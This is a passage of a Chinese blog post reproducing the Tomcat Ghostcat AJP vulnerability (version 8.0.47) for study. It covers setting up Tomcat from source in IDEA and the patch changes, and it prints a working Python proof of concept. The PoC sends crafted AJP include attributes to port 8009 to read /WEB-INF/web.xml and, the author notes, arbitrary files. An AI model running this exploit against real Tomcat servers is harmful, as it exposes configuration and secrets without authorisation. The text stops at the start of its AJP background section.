# 前言
> 最近在从零开始学习java安全，而前端时间tomcat的ghostcat漏洞比较火，这次就尝试的复现一下，如果有错误希望师傅们可以指出
## 环境搭建
> 由于要调试tomcat，所以需要下载源码，这次我用到的版本是8.0.47
  1. 在官网下载源码
  2. 在目录下创建一个pom.xml(便于之后maven下载依赖)
        4.0.0
        org.apache.tomcat
        Tomcat8.0
        Tomcat8.0
        8.0
            Tomcat8.0
            java
            test
                    java
                    test
                    org.apache.maven.plugins
                    maven-compiler-plugin
                    2.3
                        UTF-8
                        1.8
                        1.8
                junit
                junit
                4.12
                test
                org.easymock
                easymock
                3.4
                ant
                ant
                1.7.0
                wsdl4j
                wsdl4j
                1.6.2
                javax.xml
                jaxrpc
                1.1
                org.eclipse.jdt.core.compiler
                ecj
                4.5.1
  1. 在目录下创建一个名为`catalina-home`的文件夹将目录下的`webapp`和`conf`复制进去，之后再创建`logs`,`lib`,`temp`,`work`文件夹，共六个
  2. 导入IDEA后，开始自动下载
> 若未自动下载则  
>
>   
>  红色箭头处  
>  如果出现有报错cannot resolve xxx包的话，就点击红色箭头  
>
>   
>  然后点击此处，重写reimport一下即可
  1. 将`util.TestCookieFilter`注释掉，不然会报错
  2. 在`org.apache.catalina.startup.ContextConfig`  
添加`context.addServletContainerInitializer(new JasperInitializer(), null);`
  3. 配置tomcat  
Main class: `org.apache.catalina.startup.Bootstrap`  
VM options:
    -Dcatalina.home=catalina-home -Dcatalina.base=catalina-home
    -Djava.endorsed.dirs=catalina-home/endorsed -Djava.io.tmpdir=catalina-home/temp
    -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
    -Djava.util.logging.config.file=catalina-home/conf/logging.properties
  1. 启动或者调试，✿✿ヽ(°▽°)ノ✿
## 初步分析
> 由于发现者是长亭的师傅们然后poc又被集成在了他们的扫描器中，我又懒得像别的师傅那样抓包，所以最后在github上寻找到了poc
  * 观察漏洞爆出前后的github更新情况  
  * 默认关闭了AJP connector
  * 改变了默认绑定端口
  * 强制设置认证secret
  * 无法识别的属性直接403
  * poc 地址   
由于这个脚本有很多功能，最后我就把这次漏洞需要的提取出来
    import sys
    from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
    from tomcat import Tomcat
    gc = Tomcat('127.0.0.1', 8009)
    file_path = "/WEB-INF/web.xml"
    attributes = [
        {"name": "req_attribute", "value": ("javax.servlet.include.request_uri", "/",)},
        {"name": "req_attribute", "value": ("javax.servlet.include.path_info", file_path,)},
        {"name": "req_attribute", "value": ("javax.servlet.include.servlet_path", "/",)},
    ]
    hdrs, data = gc.perform_request("/", attributes=attributes)
    output = sys.stdout
    for d in data:
        try:
            output.write(d.data.decode('utf8'))
        except UnicodeDecodeError:
            output.write(repr(d.data))
修改filepath就可以实现任意文件读取
## 预备知识
### 什么是APJ
Tomcat在server.xml中配置了两种连接器。